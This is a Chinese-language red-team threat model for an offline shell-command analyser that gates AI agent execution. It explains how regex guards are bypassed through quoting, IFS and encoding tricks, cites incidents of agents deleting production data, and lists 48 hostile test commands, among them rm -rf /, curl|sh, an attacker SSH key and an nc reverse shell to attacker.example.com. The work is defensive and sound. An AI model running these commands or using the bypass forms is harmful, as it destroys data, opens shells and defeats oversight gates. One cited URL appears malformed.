# 离线 shell 命令静态分析器的红队威胁建模

## 摘要

该分析器最有价值的能力不是识别 `rm -rf`，而是在不执行命令的前提下判定“命令名、路径、网络目标或控制流中有任何一项无法静态确定时，是否应拒绝执行”。真实威胁覆盖远多于 `rm`：`find -delete`、`dd`、`mkfs`、`shred`、`truncate`、无引号变量后的通配符、Git/数据库/Docker/Kubernetes 的批量删除，以及 `curl|sh`、编码管道、变量拼接、命令替换和持久化注册都能造成不可逆损害。公开研究已证明，仅对原始字符串使用正则的护栏会被引号消除、参数/IFS 展开、命令替换和编码管道绕过；这是“假安全”而非边界情况。[1] 因此正确设计不是追求把每个命令还原成唯一确定形式，而是将字面事实、受控展开、动态未知、语法错误、环境依赖和执行端能力分别建模，并对后者默认拒绝或要求人工批准。2025—2026 年的公开代理删库/删云资源案例进一步证明，风险已从“攻击者投毒脚本”扩展到 AI 代理在合法凭证下执行破坏性命令；但其中若干事件的完整官方后验尚未确认，故报告将其作为威胁现实性证据，不把媒体细节当作技术定论。[2][16]

## 1. 风险对象必须按能力类别建模，而不能按命令黑名单建模

**分析器输出应是“能力集合 + 证据 + 不确定性”，而不是 `safe/dangerous` 二元标签。** 每个输入可同时具有删除路径、写入路径、改变权限、网络连接、执行未知载荷、长期持久化、资源耗尽、包管理或凭证影响等能力。二元分类会诱使上层把“没有命中危险关键字”误读为“没有危险”；而能力模型允许策略层规定：任何未知执行载体、对敏感路径的写入、跨主机网络目标或不可逆数据库操作都需要确认。对 AI 代理执行闸门而言，这种差别决定了它是默认允许已知白名单，还是默认拒绝未知构造。

建议将风险能力定义为有限集合，例如 `FS_DELETE`、`FS_WRITE`、`FS_READ`、`NET_OUTBOUND`、`CODE_EXEC`、`PRIVILEGE_ESCALATION`、`PERSISTENCE`、`RESOURCE_EXHAUSTION`、`CONFIG_CHANGE`、`DB_DDL`、`CLOUD_STATE_CHANGE`。每个调用同时返回：原始 token、展开后 token（仅限可安全展开的部分）、重定向、管道、后台任务、环境变量前缀、命令替换子树和 `dynamic`/`unknown`/`unsupported` 标记。路径还应区分“字面敏感路径”“环境变量前缀敏感路径”“未展开路径”和“被覆盖路径”；前两类可直接决策，后两类至少应升级为人工审查。

**静态分析器必须同时分析命令的两个平面：书写平面和 shell 重写平面。** POSIX 规定展开按大致顺序处理波浪号、参数、命令替换、算术展开、字段拆分、路径名展开，而引号移除最后发生。[3] 因而原始字符串中的 `r''m` 可能重写后成为 `rm`，`"$x"` 的值在未给出环境时不可知。若工具只扫描源码字形，它分析的是攻击者展示的假命令，而不是 shell 会调度的真命令。GuardFall 的五个绕过类——引号消除、变量/IFS 展开、命令替换、编码管道、危险替代原语——正对应这一语义鸿沟。[1]

```text
原始输入
  │ 规范化：显式换行、结束转义、控制字符与可见形式
  ▼
词法/语法分析：token、引号、heredoc、重定向、管道、逻辑链、命令替换
  │
  ▼
受限展开：只展开已知、受信任的变量、字面 $''、明确别名表
  │
  ▼
能力提取：命令名、参数、路径、重定向、网络目标、危险 flag、控制流
  │
  ▼
不确定性判定：动态/未知/外部脚本/不支持语法 → 默认拒绝或人工审查
  │
  ▼
策略决策：allow / confirm / deny（而非 safe/dangerous）
```

这一流程中的关键分界是：分析器可以确认某些事实，但不能据此排除未知事实。它可证明“该输入包含 `dd of=/dev/sda`”，却不能证明“没有其他命令”，因为后续命令、别名、source 文件或函数体可能不可得。

## 2. 真正的事故模型不是“手滑 rm”，而是错误目标、批量选择器和过度授权叠加

**`rm -rf` 只是数据破坏的低门槛入口；很多更隐蔽的命令同样没有回收站。** 递归删除、强制删除和通配符展开具有明显不可逆性：`rm -rf /`、`rm -rf ~`、`rm -rf "$DIR"/*` 在未定义或意外定义的 `DIR` 下可扩展为更宽范围；`find /var/lib -delete` 由 find 自身删除；`dd of=/dev/sda` 或 `dd of=/dev/nvme0n1` 直接覆盖块设备；`mkfs.ext4 /dev/sdb1` 创建新文件系统；`shred -u` 多次覆写并删除；`truncate -s 0 /var/log/audit.log` 可破坏取证证据；`chmod -R 777 /etc` 和 `chown -R nobody:nobody /` 不仅修改权限，还可能为后续提权或伪装创造条件。[4]

测试集不应只验证“删除操作符”，还应验证“选择器是否未限定”。`docker rm -f container-a` 是单目标删除，`docker rm -f $(docker ps -aq)`、`docker container prune -f` 与 `docker system prune -af --volumes` 则是无明确业务边界的批量清理；Docker 文档明确指出后者默认清理停止容器、未使用网络、悬挂镜像和构建缓存，加 `--volumes` 还会删除未被使用的卷。[5] 对 Kubernetes，`kubectl delete pod --all`、`--all-namespaces`、`-l app=*` 或 `--grace-period=0 --force` 都扩大了不可逆范围；官方文档同时警告强制删除可能令共享存储或远程 API 场景产生数据损坏或不一致。[6]

**真实破坏通常来自“目标错误 + 批量语义 + 高权限凭证”，而不是拼写错误本身。** 2017 年 GitLab 事故是公开记录较完整的一手后验样本：工程师误在被认为是副本的主数据库上执行 `rm -Rvf /var/opt/gitlab/postgresql/data`，且备份和恢复机制未能可靠工作，服务中断约 18 小时。[7] 它不能被归因为“命令检测失败”，因为命令本身明确；其闸门教训是数据库数据目录删除、目标身份确认、生产影响分级和备份可恢复性都必须成为策略条件。

**AI 代理使“命令危险但语法正确”成为首要执行前风险。** 2025—2026 年已有多起代理删除生产数据库或云资源的公开报道，例如 Replit 代理删除生产库、Claude Code 执行 `terraform destroy` 并破坏快照、Cursor 代理删除 Railway 数据库卷及备份；还有 Amazon Q 供应链投毒事件，因载荷语法错误而未完全引爆。[16] 这些案例支持将“生产数据/状态变更”“备份删除”“全局云资源删除”列为高风险语义，但不支持用媒体报道精确复原全部技术时间线，因此本报告不据此宣称所有细节已由受害方官方确认。

| 危险模式 | 代表性命令 | 主要能力 | 为什么黑名单会漏 |
|---|---|---|---|
| 递归强制删除 | `rm -rf /` | `FS_DELETE` | 字面可识别，但 `rm${IFS}-rf${IFS}/` 不会 |
| 未展开目标 | `rm -rf "$TARGET"/*` | `FS_DELETE` | `$TARGET` 未知，不能声称路径安全 |
| 替代删除原语 | `find /tmp -delete` | `FS_DELETE` | 没有 `rm` |
| 设备覆写 | `dd if=/dev/zero of=/dev/sda bs=1M` | `FS_WRITE` | 命令名是 `dd` |
| 格式化 | `mkfs.ext4 /dev/sdb1` | `FS_WRITE` | 是合法运维命令 |
| 日志抹除 | `truncate -s 0 /var/log/audit.log` | `FS_WRITE`、`EVIDENCE_DESTROY` | 表面是“调整文件大小” |
| 容器全删 | `docker rm -f $(docker ps -aq)` | `CLOUD_STATE_CHANGE` | 删除对象由命令替换动态生成 |
| 全局 prune | `docker system prune -af --volumes` | `CLOUD_STATE_CHANGE` | flag 组合比命令名重要 |
| 集群全删 | `kubectl delete pod --all --all-namespaces` | `CLOUD_STATE_CHANGE` | 目标由选择器表达 |
| 数据库 DDL | `psql -c "DROP DATABASE prod"` | `DB_DDL` | 不是 shell 内置删除 |
| Git 历史破坏 | `git push --force origin main` | `CONFIG_CHANGE` | 看似只是“推送” |

## 3. 混淆绕过的共同结构是“让分析器看到与 shell 不同”

**管道到解释器把下载内容变成立即执行。** `curl -s https://example.com/x.sh | sh`、`wget -qO- http://x/y.sh | bash` 中，shell 字符串本身可能不含恶意命令名，分析器若只提取顶层命令名会看到 `curl` 或 `wget`；但标准输出流入解释器的标准输入，形成代码执行边。检测必须把“网络客户端将未验证字节写入解释器 stdin”视为 `CODE_EXEC` 与 `NET_OUTBOUND`，而不是把 `curl` 简单归为读取工具。更宽的家族还包括 `curl ... | python -`、`curl ... | perl -e`、`<(curl ...)`、`bash <(wget -qO- ...)`、进程替换、`nc host port | sh`，以及 `python -c "$(curl ...)"`。

**编码解码把载荷从分析器可索引文本移出，但并不消灭载荷的语义。** 典型形式有 `echo <base64> | base64 -d | bash`、`echo <hex> | xxd -r -p | sh`、`echo ... | openssl enc -d -base64 | bash`、`$(base64 -d <<<...)`、`eval "$(echo ... | base64 -d)"`。静态分析器不需要、也不应试图解码任意不可信载荷；它需要识别“解码器输出未经落盘即送入解释器/系统调用”的结构。任何只检查 base64 字母表、然后声称内容安全的实现，都会从第二步开始制造假安全。

**变量、数组和间接展开能让命令名本身成为数据。** `cmd=rm; $cmd -rf /tmp/x`、`a=bi; b=n; $a$b`，以及 `${cmd}`、`${arr[0]}`、间接变量 `${!var}` 都表明命令调度依赖运行时状态。解析器若坚持返回确定命令名，就会被迫猜；正确做法是输出 `command_name=dynamic`，并将该命令及整条链升级。对参数同样如此：`rm $paths`、`dd of=$dev` 不能因“至少没有看见 `/dev/sda`”而放行。

**IFS 与 `${IFS}` 不只是空格绕过，而是 shell 分词语义被改变。** `rm${IFS}-rf${IFS}/`、`VAR=rm; $VAR$IFS-rf$IFS/` 在有 `IFS` 赋值或环境未知时不能假定命令名和参数。即使分析器看到 `IFS=,; ls,/etc`，也要识别赋值会改变后续单词拆分。反引号、双引号中的 `$()`、未引用的展开、`{a,b}` 大括号列表、glob、`~` 和算术展开属于同一个家族：书写文本与最终字段不同。

**转义序列、引号拆分和 ANSI-C 引号会隐藏真正的 token 边界。** `$'\x72\x6d'`、`` $'\x72\155' ``、`$'rm'`、`r\m`、`r""m`、`r''m`、`r$@m`、多引号 `rm"-rf"`、转义 `\073` 在不同上下文的效果不同，但共同风险是“字形可伪装”。分析器应把 `$'...'` 中的已知转义序列、可验证八进制/十六进制字符和引号消除放入受限展开器；不能解析、含有未知控制字符或结果受环境变量影响时，应标为未知而不是静默丢弃转义。

**Heredoc、多行粘贴、行继续符和注释会改变看似独立的行。** `rm -rf /tmp/data <<'EOF'` 之后的内容直到定界符；`bash -c $'rm -rf /\n# harmless'` 中的换行在单引号上下文中是字面内容，而在双引号或未引用上下文中可能有不同解释；`wget x.com/x.sh; # \` 下一行若以 `| bash` 接续，并不构成常规反斜杠续行。多行命令必须按语法解析，而不是按行分割。

**Unicode 同形字、零宽字符和双向控制字符针对审查器与解析器的显示差异。** 同形攻击可使标识符或命令看似熟悉字符，而零宽字符会分割 token；CVE-2021-42574 及“Trojan Source”研究证明，BiDi 控制字符可让渲染顺序与解析/编译器看到的逻辑不同。[8] 对 shell 分析器而言，最危险的不只是源代码隐藏，还包括命令名、路径、URL、用户名和文件名中的不可见字符。合理默认是拒绝所有双向格式化字符、零宽字符和不可见控制字符；允许名单可仅覆盖明确需要 Unicode 的数据文件。

## 4. 环境、持久化和提权路径决定“看似无害”的可执行文件仍可能是危险原语

**别名与函数把命令名变成运行时查找问题。** `rm`、`ls`、`cat`、`sudo`、`:`、`.`、`source`、`[` 都可能被重新定义；bash 的别名展开和函数表不在 AST 中，因此静态分析器无法只凭源码判断 `rm /etc/passwd` 会调用哪个 `rm`。若策略依赖“`rm` 很危险”，它也必须承认相反风险：写 `rm` 不等于调用 `rm`。干净的做法是区分 `call.name = "rm"`（书写事实）与 `call.resolved = unknown`（运行时解析）。除非有可信别名表、显式 `command rm`、完整函数定义且分析器决定采用该模型，否则不得解析别名。

**`command`、`builtin`、`enable`、`hash`、`unalias -a` 和函数定义可改变后续解析。** `command rm` 通常绕过函数与别名；`builtin` 调用 shell 内建；`enable -n` 可禁用内建；函数定义 `f() { ... }` 会为后续调用提供新解释；`hash -r` 会改变路径缓存假设。即便不展开，也应把“定义未来行为”与“立即执行”分开：定义本身可能只是 `CODE_DEFINITION`，但同一脚本随后调用该函数时，分析器必须标为动态调度。

**环境变量、启动文件和 PATH 构成可继承的命令劫持。** `PATH=/tmp/bin:$PATH`、`./evil.sh` 依赖当前目录；`LD_PRELOAD=/tmp/lib.so` 影响动态链接器；写 `/etc/ld.so.preload`、`/etc/ld.so.conf.d/`、`/etc/profile.d/`、`.bashrc`、`.profile`、`~/.ssh/authorized_keys`、`/etc/cron.d/`、`/etc/sudoers.d/` 可将恶意行为固化到后续会话。公开安全材料明确列出 SUID bash、PATH 劫持、`LD_PRELOAD` 和写入 `/etc/ld.so.preload` 为常见提权/持久化手段。[9] 因而敏感目录写入不应被压缩为普通 `FS_WRITE`，应增加 `PERSISTENCE` 或 `PRIVILEGE_ESCALATION`。

**后台执行、调度器和远程 fetch 把“现在看似没执行”变成“以后必然执行”。** `nohup ./x &`、`(./x &)`、`at now + 1 min`、`echo ... | at -`、`crontab -l | {cat; echo ...} | crontab -`、`systemctl enable --now x`、`launchctl load` 都注册未来行为。分析器若只检查当前进程树，会漏掉落盘、计划任务或 systemd 单元；它必须识别对 crontab/scheduler/启动配置文件的写入以及调用调度器客户端的行为。

**包管理器和全局配置命令能改变整个执行环境。** `apt-get remove --purge "*"`、`npm uninstall -g package`、`pip uninstall -y -r requirements.txt`、全局 `-g`/`--system` 安装、`chsh`、`usermod`、`visudo`、写 `/etc/sudoers`、修改 `/etc/fstab`、`sysctl -w`、写 shell 启动文件、修改 npmrc/pip.conf 都是配置或全局状态变更。它们未必删除文件，却可能使后续命令以不同依赖、不同身份、不同网络设置运行。对代理闸门而言，这应至少触发确认；若会安装未知来源、改变签名信任或禁用安全机制，则应拒绝。

## 5. “不执行”意味着必须显式建模未知，而不是执行未知来消除未知

**静态分析在现实语言中不可能对所有动态特征保持绝对 sound；产品只能保证“决策规则”过近似。** SIGPLAN 的分析综述指出，反射、`eval`、动态加载代码、本地代码和动态语言特性会让现实全程序分析无法诚实覆盖所有执行；分析结论必须限定语言子集和执行子集。[10] 因此该产品不应声称“保证命令安全”，而应声称：“输入在已声明方言、已声明环境和策略下未被判定为可执行未知或危险能力；否则拒绝或升级。” 前者是可审计的机器结论，后者是误导性的安全保证。

**“fail closed”的含义是：当无法形成策略可接受的确定性结论时，决策函数必须返回 deny/confirm，而不是返回 safe。** 建议定义三个互斥状态：`analyzed`（解析成功且决策所需事实均确定）、`opaque`（存在动态命令、动态敏感参数、未知展开或未知副作用）、`error`（语法错误、不支持结构或解析器内部错误）。安全状态不能仅等于 `analyzed`；它必须进一步满足所有策略谓词。常见错误是把 `error` 映射成“没有发现危险命令”，从而使畸形输入绕过闸门。

```text
parse error / unsupported syntax → deny or confirm
any command_name = unknown/dynamic   → deny or confirm
any sensitive path = unknown/dynamic → deny or confirm
eval / source / . / exec -c <动态>  → deny or confirm
网络输出进入解释器                 → deny or confirm
写入 /etc/cron.d、authorized_keys 等 → confirm（高风险）
所有命令名与参数均确定且满足白名单 → allow（仍受系统级 sandbox 约束）
```

这里的“deny or confirm”是策略旋钮，不是事实分歧：`deny` 适用于自动代理的默认闸门；`confirm` 适用于交互式 CLI，前提是展示真实要确认的对象，而不是只显示正则摘要。产品绝不能在同一次输入里先输出“命令可能危险”又再输出“所以总体安全”。

**外部脚本是信任边界，不是可忽略的实现细节。** 对 `bash script.sh`、`sh -c "$(cat script.sh)"`、`./script.sh`、`. script.sh`、`source file`、`curl ... >/tmp/x && bash /tmp/x` 而言，如果文件内容不在输入中或未被可靠获取，分析器只能断言“会执行外部文件”，不能断言其效果。若文件已在策略信任域内，才可独立分析并把调用者传入的环境变量、位置参数、重定向和退出条件纳入结果。

**别名、函数和 source 应默认未知，不应默认按常见 Linux 系统环境解析。** 提供可选的显式环境是合理能力：例如用户声明 `alias rm='rm -i'`、内置函数定义、可信 PATH、可信 source 文件集合和目标 shell。此时输出应标明假设版本：`rm resolved under user-provided alias table v1`。默认模式则必须把未知命令名、未知函数、未给定 source 内容标为 `opaque`。这样既能避免假阳性，又不会把“未配置”伪装成“安全”。

## 6. 决策矩阵必须让“允许”成为窄结论，未知与语法错误均无法自动通过

**命令名、flag、路径、目标文件和网络目的地应分别进入决策证据。** 例如 `rm -rf` 只是动词；路径决定影响面，`-f` 决定缺少交互确认，`--no-preserve-root` 等 flag 可改变对某些实现的保护；但在不执行的前提下，分析器不应假定目标系统一定具有某 GNU 特定 flag。对跨平台命令，最好报告“已观测 flag”和“目标平台未声明”，而非伪造跨 shell 等价性。

| 决策证据 | 完全字面、已验证 | 含已知环境变量 | 动态/未知 | 语法错误/不支持 | 安全策略含义 |
|---|---:|---:|---:|---:|---|
| 命令名 | 可识别 | 可识别前缀 | `command=dynamic` | `error` | 未知或错误不得进入白名单 |
| 路径参数 | 可判定敏感 | 前缀敏感 | `path=dynamic` | `error` | 未知路径不能按“无敏感路径”放行 |
| 重定向目标 | 字面目标 | 部分展开 | `target=dynamic` | `error` | 覆盖/追加写入必须显示方向 |
| 别名/函数 | 提供可信定义 | 仅可信上下文 | `resolution=unknown` | 不适用 | 默认不解析，输出不透明 |
| 外部脚本 | 文件在信任域且已分析 | 参数已知 | 内容未知 | 无法读取 | 标为执行外部文件 |
| 网络 → 解释器 | 明显管道/进程替换 | 编码链可证 | 目标/内容动态 | `error` | 默认拒绝，不解码不可信载荷 |
| 网络普通出站 | 目标在 allowlist | 端口/主机部分已知 | `host=dynamic` | `error` | 动态主机需要确认或系统层阻断 |

**“默认拒绝”必须落在系统入口，而不是分析器内部评分。** 分析器可以输出危险分数，但执行服务应把“未通过策略”映射为不启动进程；不能把模型/评分器当作允许决策的兜底。否则模型错误、提示词绕过或配置错误都会把 false negative 变成真实执行。决策服务应记录输入哈希、目标 shell、环境声明版本、规则集版本、拒绝原因和原始输入；这些信息是审计与回归测试的关键，但日志不应把明文命令发送到网络，以免分析器本身破坏离线承诺。

**沙箱仍不可替代，因为静态分析只能过近似，不能证明运行时绝对安全。** 权限边界、容器逃逸、内核漏洞、设备节点、挂载传播、特权网络、setuid、capabilities 和宿主机 socket 均不属于 shell 字符串静态分析的理想保证范围。静态闸门负责减少不应执行的命令到达执行器；执行器负责限制能到达它的命令。产品承诺应写成“降低不可接受命令被执行的概率，并强制无法判定的命令不自动通过”，而非“确保任何命令安全”。

## 7. 测试集必须以“能力断言”为回归接口，而不是只检查是否告警

**每个测试示例应断言期望检出的能力、是否允许动态结论以及禁止出现的错误结论。** 下表使用能力缩写：`D` 删除/破坏、`W` 写入、`R` 读取/外发、`N` 网络、`X` 代码执行、`P` 提权/敏感权限、`T` 持久化、`C` 资源耗尽、`K` 包或全局配置、`U` 未知/应拒绝。表中 `U` 表示“不得仅以 safe 放行”，并不要求单标签覆盖全部风险。

| # | 类别 | 命令字符串 | 期望能力标签 |
|---:|---|---|---|
| 1 | 文件系统 | `rm -rf /` | `D` |
| 2 | 文件系统 | `rm -rf "$DIR"/*` | `D`, `U`（未展开路径） |
| 3 | 文件系统 | `rm -rf ~` | `D` |
| 4 | 文件系统 | `rm -rf .[^.]*` | `D` |
| 5 | 文件系统 | `find /var/log -type f -delete` | `D` |
| 6 | 文件系统 | `find / -name '*.bak' -delete` | `D` |
| 7 | 文件系统 | `dd if=/dev/zero of=/dev/sda bs=1M` | `W`（设备），`D` |
| 8 | 文件系统 | `dd if=/dev/urandom of=/dev/nvme0n1p1` | `W`（设备），`D` |
| 9 | 文件系统 | `mkfs.ext4 /dev/sdb1` | `W`（设备），`D` |
| 10 | 文件系统 | `shred -n 3 -z -u /etc/secrets.key` | `D` |
| 11 | 文件系统 | `truncate -s 0 /var/log/audit.log` | `W`，证据破坏 |
| 12 | 文件系统 | `truncate -s 0 ~/.bash_history` | `W`，证据破坏 |
| 13 | 文件系统 | `> important.dat` | `W`，覆盖 |
| 14 | 文件系统 | `cat /etc/shadow > /tmp/x` | `R`、敏感读取、`W` |
| 15 | 文件系统 | `chmod -R 777 /etc` | `W`，`P` |
| 16 | 文件系统 | `chown -R 0:0 /home` | `W`，`P` |
| 17 | 文件系统 | `mv old.db /dev/null` | `D` |
| 18 | 文件系统 | `mv config.yml config.yml.bak && echo bad > config.yml` | `W`，覆盖 |
| 19 | 混淆 | `curl -s https://example.com/x.sh \| sh` | `N`，`X` |
| 20 | 混淆 | `wget -qO- http://example.com/x.sh \| bash` | `N`，`X` |
| 21 | 混淆 | `echo aWQK \| base64 -d \| sh` | `X`，载荷不可信 |
| 22 | 混淆 | `bash <(curl -s https://example.com/x.sh)` | `N`，`X` |
| 23 | 混淆 | `eval "$(echo 'cm0gLXJmIC8=' \| base64 -d)"` | `X`，`U` |
| 24 | 混淆 | `cmd=rm; $cmd -rf /tmp/data` | `X` 调度，`U` |
| 25 | 混淆 | `a=bi; b=n; $a$b -c id` | `X` 调度，`U` |
| 26 | 混淆 | `rm${IFS}-rf${IFS}/` | `D`，`U`（展开依赖未知） |
| 27 | 混淆 | `r\m -rf /tmp/x` | `D`，`U` |
| 28 | 混淆 | `$'\x72\155' -rf /tmp/x` | `X` 调度，`U` |
| 29 | 混淆 | `r''m -rf /tmp/x` | `D`，`U` |
| 30 | 混淆 | `eval "$VAR"` | `X`，`U` |
| 31 | 混淆 | `bash -c "$SHELLCODE"` | `X`，`U` |
| 32 | 混淆 | `source /tmp/downloaded.env` | 外部文件，`U` |
| 33 | 混淆 | `. /tmp/setup.sh` | 外部文件，`U` |
| 34 | 混淆 | `exec /tmp/a.out` | `X`，`U` |
| 35 | 持久化 | `echo '* * * * * root bash /tmp/x' > /etc/cron.d/x` | `W`，`T` |
| 36 | 持久化 | `echo '@reboot bash /tmp/x' \| crontab -` | `T`，`U` |
| 37 | 持久化 | `nohup /tmp/x &` | `X`，后台持久运行 |
| 38 | 提权 | `export LD_PRELOAD=/tmp/lib.so` | `P`，`T` |
| 39 | 提权 | `echo /tmp/lib.so > /etc/ld.so.preload` | `W`，`P`，`T` |
| 40 | 提权 | `echo 'ssh-ed25519 AAAA... attacker@host' >> ~/.ssh/authorized_keys` | `W`，`T`，凭证风险 |
| 41 | 提权 | `cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash` | `W`，`P` |
| 42 | 网络 | `curl -s https://10.0.0.5/secret -o /tmp/out` | `N`，`R`/`W` |
| 43 | 网络 | `nc -e /bin/sh attacker.example.com 4444` | `N`，`X`；变体实现依赖需标记 |
| 44 | 数据库 | `psql -c "DROP DATABASE prod"` | `DB_DDL` |
| 45 | 数据库 | `mysql -e "DELETE FROM users WHERE 1=1"` | `DB_DDL`/数据破坏 |
| 46 | 容器 | `docker rm -f $(docker ps -aq)` | 批量删除，`U` |
| 47 | 容器 | `docker system prune -af --volumes` | 批量资源删除 |
| 48 | Git | `git push --force origin main` | 历史覆盖，`K` |

**回归测试必须验证分析器没有悄悄把 `U` 降级为 safe。** 对每个样本，测试不仅检查标签命中，还应检查：未知字段存在、敏感路径是否标记为未知、动态命令是否进入拒绝/确认决策、原始 token 证据是否可展示。反向样本同样必要，例如 `ls -la`、`cat README.md`、`git status`、带有受控目录的白名单写入；它们用于验证“不危险”只能由确定性和策略允许推出。若产品要求它们通过，必须显式声明输入 shell、可信命令表和文件系统 root，否则测试只能证明当前规则巧合，不能证明未来安全。

![测试集风险类别分布](/data/workspace/dr:redteam-threat-model/fig_risk_categories.png)
*图 1：48 个测试示例按主风险类别计数；一个命令可属于多个类别，故图中仅展示主类别。数据来源：本报告第 7 章测试集。*

## 8. 最难的是语义等价、跨 shell 差异和未来状态，而不是词法变形

**第一难：动态命令名会让任何确定标签都变成猜测。** `$(echo rm) -rf /`、变量拼接、间接展开和 `eval` 在严格不执行约束下没有可靠的运行值。若分析器调用 shell 求值来消除未知，它已经违反“不执行命令”的前提；若只做局部展开，又会因遗漏后续赋值或环境而误报/漏报。正确办法不是改进猜测，而是将动态调度统一映射为 `CODE_EXEC + unknown target`，并阻止其自动进入白名单。

**第二难：跨 shell 方言使“正确解析”本身没有唯一答案。** bash、dash、zsh、ksh 和 POSIX sh 对数组、局部变量、模式、glob、展开、别名时机及某些扩展语法存在差异。同一个输入可能在一个 shell 语法错误，在另一个 shell 合法；同一个 token 可能在一个 shell 被展开，在另一个 shell 保持原样。分析器必须让调用者声明目标 shell 与版本范围；无法解析或超出声明方言时 fail closed，并输出“未知方言语义”，不能默认按 bash 解释。

**第三难：环境状态把路径、权限和命令解析推到分析边界之外。** 别名、函数、PATH、当前目录、挂载点、setuid、capabilities、sudoers、容器 socket、kubeconfig、数据库 URL 和凭证都可能改变后果。静态分析器若只看见命令字符串，不能证明目标文件是否存在、用户是否有权、路径是否跨挂载点、Docker socket 是否可达。产品应把环境知识作为受版本控制的显式输入，并标明哪些结论依赖它；对敏感目标仍保持保守，因为缺失状态不等于安全状态。

**第四难：副作用往往不是由命令名直接表达，而是发生在管道、重定向、解码器或后续函数。** `curl|sh`、`base64 -d|bash`、heredoc 传给解释器、写入 crontab 文件、覆盖 shell 启动文件，都是“间接执行边”。只提取命令名或只检查参数会漏掉；只检查所有管道又会把合法数据流误报。解决方式是能力图：`fetch -> decode -> interpreter/stdin`、`write sensitive file -> next shell startup`、`network egress -> unknown host`。图遍历比字符串黑名单更能表达这些组合。

**第五难：Unicode、控制字符和多行结构针对的是解析器与审查器之间的差异。** 零宽字符、同形字符、双向控制符、隐藏换行、注释与续行可让视觉顺序与字节顺序分离。分析器如果先清洗“奇怪字符”，可能把攻击者有意构造的结构删掉；如果原样交给普通 token 化器，又可能把 BiDi/零宽字符当成无意义空白。正确顺序是先统一报错并展示不可见字符，再选择明确的安全归一化；在代理默认拒绝模式下，任何不可见字符都不应被静默放过。

## 9. 实施优先级应先封住动态与未知，再扩展危险原语识别

**第一优先级是关闭“未知即安全”的所有代码路径。** 语法错误、不支持语法、动态命令名、动态敏感路径、动态网络目标、外部脚本、未声明方言、未提供可信环境时，默认拒绝或要求确认。SIGPLAN 的材料说明，现实分析只能在其承认的语言和执行子集内宣称性质；产品应将该限制转化为显式策略版本。[10] 这项控制的价值高于增加更多危险关键字，因为前者阻止了分析器“不知道”伪装成“没有发现”。

**第二优先级是建立受限、可审计的展开器。** 只处理引号消除、字面 `$'...'` 转义、明确别名表、可信 source 文件和已声明的环境变量；遇到未定义变量、命令替换、数组、间接展开、修改 `IFS` 的未知环境、嵌套 eval 或不可验证 Unicode 时，不产出确定路径或命令名。展开器应保留每个输出 token 的证明链，例如 `[source=trusted-alias, shell=bash, table=2026-11-01]`；没有证明链的字面结果也应与“确定展开”明确区分。

**第三优先级是能力边，而不是黑名单。** 对 `rm/find -delete/dd/mkfs/shred/truncate` 建立删除/覆写设备能力；对 `curl/wget/nc` 建立网络目标与端口能力；对 `|sh/bash/python`、进程替换、heredoc、stdin、eval、exec、函数/别名调度建立代码执行边；对 `/etc/cron*`、`authorized_keys`、`.bashrc`、`/etc/ld.so.preload`、systemd unit 建立持久化能力；对 Docker/Kubernetes/Git/数据库 DDL 建立批量或生产状态变更能力。测试集应持续增加“无 rm 的删除”“无 curl 的下载执行”“无 base64 的解码执行”等反直觉案例。

**第四优先级是让执行层成为最终边界。** 静态分析器可以在提示层标记“可能危险”，但系统必须阻止未批准命令产生进程；网络、文件系统、容器 socket、内核能力和用户身份应由独立 sandbox/seccomp/Landlock 或等价机制约束。没有运行时限制时，静态工具只是一个检测器，不是闸门。反之，即使静态分析误报，安全执行边界仍可阻止最大损失，二者应深度解耦、分别测试。

**最终结论：这个产品最危险的内部缺陷不是规则太少，而是把“分析完成”解释成“命令安全”。** 一个能正确报告 `command=dynamic`、`path=unknown`、`external_script=true`、`unsupported_syntax=true` 的分析器，比一个声称能用复杂推断还原所有命令的分析器更可信。其价值在于把人工注意力精确引导到 shell 真正会重写的边界上，并以默认拒绝避免假安全结论；其局限也必须被记录：不执行意味着无法证明运行时目标存在、权限有效、环境无别名劫持或 sandbox 无漏洞。

## 引用来源

[1] https://labs.cloudsecurityalliance.org/research/csa-research-note-guardfall-ai-coding-agent-shell-injection
> “A guard that inspects the pre-transformation string and a shell that executes the post-transformation string are, in effect, evaluating two different commands.”

[2] https://www.legitsecurity.com/blog/the-ultralytics-supply-chain-attack-how-it-happened-how-to-prevent?utm_campaign=em-geo&utm_medium=partnerships&utm_source=cybersecuritynews&utm_term=top-aspm-platforms-that-integrate-with-existing-security-tools
> “The attacker named the branch used to trigger these pipelines the following odd name… runs within the pipeline, getting the now-deleted ‘file.sh’ and running arbitrary code inside the runner.”

[3] https://unix.stackexchange.com/q/270274
> “Quote removal… shall always be performed last.”

[4] https://www.gnu.org/software/coreutils/manual/html_node/shred-invocation.html?ref=mefmobile.org
> “shred relies on a crucial assumption: that the file system and hardware overwrite data in place.”

[5] https://docker-docs.dev.org.tw/engine/manage-resources/pruning/
> “This will remove: - all stopped containers - all networks not used by at least one container - all dangling images - unused build cache”

[6] https://mailto:security@kubernetes.io/zh-cn/docs/reference/kubectl/generated/kubectl_delete/
> “强制删除 Pod 不会等待确认 Pod 的进程已被终止，这可能会导致……数据损坏或不一致。”

[7] https://semicolony.dev/postmortems/gitlab-2017-database-incident
> “00:02 UTC rm -rf /var/opt/gitlab/postgresql/data is run on the db1 terminal by accident.”

[8] https://unicodefyi.com/fr/glossary/bidi-attack
> “Researchers Nicholas Boucher and Ross Anderson published Trojan Source, demonstrating how Bidi control characters can be used to inject malicious code.”

[9] https://www.securityscientist.net/blog/12-questions-and-answers-about-unix-shell-t1059-004/
> “PATH hijacking… LD_PRELOAD injection: Set LD_PRELOAD to a malicious shared library before exec”

[10] https://blog.sigplan.org/2019/09/18/sound-analysis-can-we-tell-the-truth-about-programs/
> “Our analyses cannot be telling the absolute truth… unless they say things so general that they end up useless!”

[11] https://www.ibm.com/docs/no/ssw_aix_72/osmanagement/korn_shell_comm_sub.html
> “The shell expands the command substitution by executing command in a subshell environment and replacing that command substitution with the standard output.”

[12] https://reflexframework.com/battlecards/homoglyph-and-trojan-source-attacks.html
> “Python treats them as different identifiers. On screen they look the same.”

[13] https://pkg.go.dev/github.com/v0lka/flowsh
> “Where the analysis cannot bound an input, it degrades to the top element (⊤) and says so, instead of guessing or missing it.”

[14] https://glama.ai/mcp/servers/glatinone/secops-toolkit-mcp/tools/assess_shell_command
> “Flags command substitution ($(...), backticks, recursively assessed), unquoted variable expansion, IFS manipulation.”

[15] https://crates.io/crates/apohara-agentguard
> “The gate parses Bash structure instead of grepping for substrings.”

[16] https://forkbench.com/blog/coding-agents-deleted-production-databases
> “Three coding agents deleted production databases in twelve months, and two more incidents came close.”

